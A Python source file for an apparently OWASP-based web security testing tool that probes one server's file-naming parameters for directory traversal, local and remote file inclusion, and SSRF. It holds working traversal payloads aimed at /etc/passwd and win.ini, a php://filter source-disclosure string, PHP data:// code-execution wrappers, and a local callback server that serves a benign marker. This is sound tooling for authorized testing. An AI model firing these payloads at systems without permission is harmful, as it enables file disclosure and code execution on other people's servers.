"""Directory-traversal and file-inclusion probe of one web server (WSTG-ATHZ-01 step 2).

`wstg-trav --base URL [--list DIR] [--katana DIR] [--har DIR] [--max N] [--pause S]`

Candidates (a URL with a file-naming parameter such as file, path, page, template,
include, doc, download, dir, img, url) come from the tester's list, the crawl, and
the HAR. For each candidate parameter the tool sends the original value (baseline)
and a small fixed set of traversal / inclusion payloads, keeping the other parameters
unchanged, and reports status, size, and a short body excerpt for each, flagging a
TRAVERSAL when a well-known file signature appears in the response (/etc/passwd,
win.ini, /etc/hostname) or the answer changed in a file-like way.

For remote file inclusion the tool runs a short-lived local HTTP server (the callback)
and sends each parameter a URL pointing at it; if the target fetches that URL the
parameter includes a remote file (or is an SSRF), and if the response shows the computed
value the remote file ran. The callback address is auto-detected from the route to the
target, or given with --callback; --no-callback skips it.

Safety: only the host of `--base` is contacted directly; GET only; redirects are not
followed; when the HAR holds a logged-in storage state its cookies are used so parameters
behind login are reached; TLS is not verified; WSTG_PAUSE (--pause) applies. The callback
server serves only a benign marker from the tester's own host and is closed at the end.
Exit 4 when no request got an answer.
"""
from __future__ import annotations

import argparse
import base64
import http.server
import re
import socket
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import urlsplit

from . import entrypoints as ep
from . import har as harmod

FILE_PARAM_RE = re.compile(
    r"^(file|path|page|lang|language|template|tpl|include|inc|doc|document|download|dir|folder|"
    r"name|img|image|url|uri|load|read|view|src|pdf|report|style|theme|module|action|cat|content)$", re.I)
MAX_PARAMS = 25
EXCERPT_BYTES = 400

# (label, payload) pairs. The payload replaces the parameter's value verbatim (already
# encoded where it needs to be), so the other parameters and the path stay unchanged.
_UP = "../" * 8
PAYLOADS = [
    ("traversal /etc/passwd", _UP + "etc/passwd"),
    ("traversal /etc/hostname", _UP + "etc/hostname"),
    ("backslash ..\\ windows/win.ini", "..\\" * 8 + "windows\\win.ini"),
    ("encoded %2e%2e%2f /etc/passwd", "%2e%2e%2f" * 8 + "etc%2fpasswd"),
    ("double-encoded %252e /etc/passwd", "%252e%252e%252f" * 8 + "etc%252fpasswd"),
    ("....// bypass /etc/passwd", "....//" * 8 + "etc/passwd"),
    ("absolute /etc/passwd", "/etc/passwd"),
    ("null byte /etc/passwd%00.png", _UP + "etc/passwd%00.png"),
    ("trailing dot /etc/passwd....", _UP + "etc/passwd...."),
    ("php filter wrapper (source disclosure)", "php://filter/convert.base64-encode/resource=index"),
]

# Inclusion-execution markers: a benign payload that, if the parameter includes AND runs
# the content, evaluates an arithmetic expression. Seeing the computed EXEC_RESULT proves
# code execution; seeing EXEC_SOURCE (the un-evaluated expression) means the file was
# included but only displayed. No OS command is run and no external host is contacted.
EXEC_SOURCE = "31337*31337"
EXEC_RESULT = "982007569"                      # 31337 * 31337
_PHP = base64.b64encode(f"<?php echo {EXEC_SOURCE}; ?>".encode()).decode()
EXEC_PAYLOADS = [
    ("php data:// wrapper (code execution)", f"data://text/plain;base64,{_PHP}"),
    ("php data:// wrapper, url-encoded", "data://text/plain;base64," + _PHP.replace("=", "%3d")),
]

# Remote file inclusion: the tool runs a short-lived HTTP server (the "callback") that
# the target can fetch a benign PHP marker from. If the target fetches it, the parameter
# includes a remote file (or is an SSRF); if the response then shows EXEC_RESULT the
# remote file ran. Only the tester's own host serves the file; nothing external is used.
class Callback:
    def __init__(self, host: str, port: int = 0):
        self.hits: dict[str, str] = {}             # token -> client address that fetched it
        self._lock = threading.Lock()
        self.httpd = http.server.ThreadingHTTPServer(("0.0.0.0", port), self._handler())
        self.port = self.httpd.server_address[1]
        self.base = f"http://{host}:{self.port}"
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()

    def url(self, token: str) -> str:
        return f"{self.base}/p{token}.txt"

    def _handler(self):
        cb = self
        body = f"<?php echo {EXEC_SOURCE}; ?>".encode()

        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):                       # noqa: N802
                token = self.path[2:].split(".", 1)[0].split("?", 1)[0]
                with cb._lock:
                    cb.hits.setdefault(token, self.client_address[0])
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            do_POST = do_GET                        # noqa: N815
            do_HEAD = do_GET                        # noqa: N815

            def log_message(self, *a):              # keep the probe output clean
                pass
        return H

    def hit(self, token: str, wait: float = 0.0) -> str | None:
        end = time.monotonic() + wait
        while True:
            with self._lock:
                if token in self.hits:
                    return self.hits[token]
            if time.monotonic() >= end:
                return None
            time.sleep(0.05)

    def close(self):
        self.httpd.shutdown()
        self.httpd.server_close()


def detect_ip(host: str, port: int) -> str | None:
    """The local address the OS would use to reach the target (so the target can reach
    it back). None when there is no route (for example the target is only reachable
    through a proxy); then a callback address must be given explicitly."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((host, port))
            return s.getsockname()[0]
        finally:
            s.close()
    except OSError:
        return None


def start_callback(args, pr) -> tuple[Callback | None, str]:
    """Start the callback server, or return (None, reason) when it is off or impossible."""
    if args.no_callback:
        return None, "remote file inclusion test off (--no-callback)"
    if args.callback:
        u = urlsplit(args.callback if "://" in args.callback else "http://" + args.callback)
        host, port = u.hostname, (u.port or 0)
        if not host:
            return None, f"bad --callback {args.callback!r}"
    else:
        host, port = detect_ip(pr.host, pr.port), 0
        if not host:
            return None, (f"no callback address found (no route to {pr.host}); pass "
                          "--callback http://YOUR-IP:PORT to test remote file inclusion")
    try:
        return Callback(host, port), ""
    except OSError as e:
        return None, f"could not start the callback server: {e}"


# A response matching one of these almost certainly contains an out-of-scope file.
SIGNATURES = [
    ("/etc/passwd", re.compile(r"root:.*?:0:0:", re.S)),
    ("win.ini", re.compile(r"(?i)\[(fonts|extensions|mci extensions)\]|for 16-bit app support")),
    ("base64-encoded source", re.compile(r"PD9waHA|PD9QSFA|PCFET0NUWVBF")),   # "<?php"/"<!DOCTYPE" base64
]


@dataclass
class Candidate:
    path: str
    param: str
    pairs: list[tuple[str, str]]       # the full query, raw (name, value)
    index: int                          # which pair is the file parameter
    sources: set = field(default_factory=set)

    def url(self, base: str, payload: str) -> str:
        q = "&".join(f"{n}={payload if i == self.index else v}" for i, (n, v) in enumerate(self.pairs))
        return f"{base}{self.path}?{q}"


class Probe:
    def __init__(self, base: str):
        u = urlsplit(base)
        self.scheme, self.host = u.scheme, (u.hostname or "").lower()
        self.port = u.port or (443 if u.scheme == "https" else 80)
        self.base = f"{u.scheme}://{u.netloc}"
        self.cands: dict[tuple[str, str], Candidate] = {}
        self.notes: list[str] = []

    def _on_host(self, url: str) -> str | None:
        u = urlsplit(url.strip())
        if not u.scheme:
            return None
        try:
            port = u.port or (443 if u.scheme == "https" else 80)
        except ValueError:
            return None
        if (u.hostname or "").lower() != self.host or port != self.port:
            return None
        return u.path or "/"

    def add_url(self, url: str, source: str) -> None:
        path = self._on_host(url)
        if path is None:
            return
        _, _, query = url.partition("?")
        if not query:
            return
        pairs = [(kv.split("=", 1)[0], kv.split("=", 1)[1] if "=" in kv else "") for kv in query.split("&") if kv]
        for i, (name, _) in enumerate(pairs):
            if FILE_PARAM_RE.match(name):
                self.cands.setdefault((path, name), Candidate(path, name, pairs, i)).sources.add(source)


def _read(path: Path) -> str:
    return path.read_text(errors="replace")


def collect_candidates(pr: Probe, args) -> list[tuple[str, dict]]:
    """Fill pr.cands from the list, crawl, and HAR; return the HAR storage states."""
    for f in ep._files(Path(args.list) if args.list else None):
        for line in _read(f).splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                url = line if "://" in line else self_join(pr.base, line)
                if pr._on_host(url) is None:
                    pr.notes.append(f"list: {line} is not a URL on {pr.host} with a query; skipped")
                else:
                    pr.add_url(url, "list")
    kat = Path(args.katana) / "katana.txt" if args.katana else None
    if kat and kat.is_file():
        for line in _read(kat).splitlines():
            if "://" in line:
                pr.add_url(line.split()[0], "crawl")
    states = []
    if args.har:
        inv = ep.Inventory(pr.base + "/")
        states = ep.read_har(inv, Path(args.har))
        for e in inv.entries.values():
            if e.params.get("query"):
                pr.add_url(pr.base + e.path + "?" + "&".join(f"{n}=x" for n in sorted(e.params["query"])), "har")
    return states


def self_join(base: str, line: str) -> str:
    return base + "/" + line.lstrip("/")


def signature(body: str) -> str | None:
    for name, rx in SIGNATURES:
        if rx.search(body):
            return name
    return None


def _excerpt(body: str) -> str:
    return re.sub(r"\s+", " ", body[:EXCERPT_BYTES]).strip()


def run(args) -> int:
    pr = Probe(args.base)
    states = collect_candidates(pr, args)
    cookie = ""
    role = ""
    for r, st in states:
        if not harmod._ANON_ROLE_RE.match(r):
            ck = ep.cookie_header(st, pr.scheme, pr.host, "/")
            if ck:
                cookie, role = ck, r
                break
    cands = list(pr.cands.values())
    listed = [c for c in cands if "list" in c.sources]
    rest = [c for c in cands if "list" not in c.sources]
    probe = listed + rest[: max(0, args.max - len(listed))]
    over = cands[len(probe):] if len(cands) > len(probe) else []

    cb, cb_note = start_callback(args, pr)
    print(f"# traversal/inclusion probe of {pr.base}; GET only, redirects not followed, only {pr.host} contacted")
    print(f"# cookies: {'logged-in session ' + role if cookie else 'none (anonymous)'}")
    print(f"# {len(cands)} file-naming parameter(s); {len(probe)} probed, {len(over)} over the limit of {args.max}")
    if cb:
        print(f"# remote file inclusion: the target is asked to fetch a benign file from the callback at {cb.base}")
    else:
        print(f"# {cb_note}")
    for n in pr.notes:
        print(f"# {n}")

    sent = answered = 0
    try:
        for idx, c in enumerate(probe):
            print()
            print(f"== {c.path}?{c.param}=   [sources: {', '.join(sorted(c.sources))}]")
            base_ans = ep.fetch(c.url(pr.base, c.pairs[c.index][1]), cookie)
            sent += 1
            answered += base_ans.status is not None
            print(f"   baseline ({c.param}={c.pairs[c.index][1] or '(empty)'}): {base_ans.short()}")
            for label, payload in PAYLOADS:
                if args.pause:
                    time.sleep(args.pause)
                a = ep.fetch(c.url(pr.base, payload), cookie)
                sent += 1
                answered += a.status is not None
                hit = signature(a.body) if a.status == 200 else None
                flag = ""
                if hit:
                    flag = f"   <= TRAVERSAL: response contains {hit}"
                elif a.status == 200 and base_ans.status == 200 and abs(a.size - base_ans.size) > max(64, base_ans.size // 2):
                    flag = "   <= changed a lot from the baseline (check the excerpt)"
                print(f"   {label}: {a.short()}{flag}")
                if hit or flag:
                    print(f"       excerpt: {_excerpt(a.body)}")
            for label, payload in EXEC_PAYLOADS:
                if args.pause:
                    time.sleep(args.pause)
                a = ep.fetch(c.url(pr.base, payload), cookie)
                sent += 1
                answered += a.status is not None
                flag = ""
                if a.status == 200 and EXEC_RESULT in a.body:
                    flag = "   <= CODE EXECUTION: the included wrapper ran (evaluated an expression)"
                elif a.status == 200 and EXEC_SOURCE in a.body:
                    flag = "   <= included but shown as source, not executed"
                print(f"   {label}: {a.short()}{flag}")
                if flag:
                    print(f"       excerpt: {_excerpt(a.body)}")
            if cb:
                if args.pause:
                    time.sleep(args.pause)
                url = cb.url(str(idx))
                a = ep.fetch(c.url(pr.base, url), cookie)
                sent += 1
                answered += a.status is not None
                client = cb.hit(str(idx), wait=2.0)
                shown = a.status == 200 and EXEC_RESULT in a.body
                src = a.status == 200 and EXEC_SOURCE in a.body
                if client and shown:
                    flag = f"   <= REMOTE CODE EXECUTION: the target fetched your file (from {client}) and ran it"
                elif client and src:
                    flag = f"   <= REMOTE FILE INCLUDED as source: fetched from {client}, not executed"
                elif client:
                    flag = f"   <= SSRF/RFI: the target fetched the callback (from {client}); output not reflected"
                elif shown:
                    flag = "   <= CODE EXECUTION but no callback hit (check the excerpt)"
                else:
                    flag = "   <= no callback received (remote include likely disabled, or the callback is unreachable)"
                print(f"   remote file inclusion ({url}): {a.short()}{flag}")
                if client or shown or src:
                    print(f"       excerpt: {_excerpt(a.body)}")
    finally:
        if cb:
            cb.close()
    if over:
        print()
        print(f"== not probed (over the limit of {args.max}; add them to the list to probe them)")
        for c in over:
            print(f"   {c.path}?{c.param}=")
    if not probe:
        print("\n(no file-naming parameter found: type candidate URLs in the list, or collect the crawl/HAR)")
        return 0
    if sent and not answered:
        print(f"no request to {pr.base} got an answer; collect again", file=sys.stderr)
        return 4
    return 0


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(prog="wstg-trav", description=__doc__.split("\n\n")[0])
    ap.add_argument("--base", required=True, help="base URL of the target (the only host contacted)")
    for opt in ("list", "katana", "har"):
        ap.add_argument(f"--{opt}", help="evidence version folder (optional)")
    ap.add_argument("--max", type=int, default=MAX_PARAMS, help="file-naming parameters to probe")
    ap.add_argument("--pause", type=int, default=0)
    ap.add_argument("--callback", help="base URL the target should fetch the remote-inclusion file from "
                    "(http://IP[:PORT]); auto-detected from the route to the target when omitted")
    ap.add_argument("--no-callback", action="store_true", help="skip the remote file inclusion test")
    return run(ap.parse_args(argv))


if __name__ == "__main__":
    raise SystemExit(main())
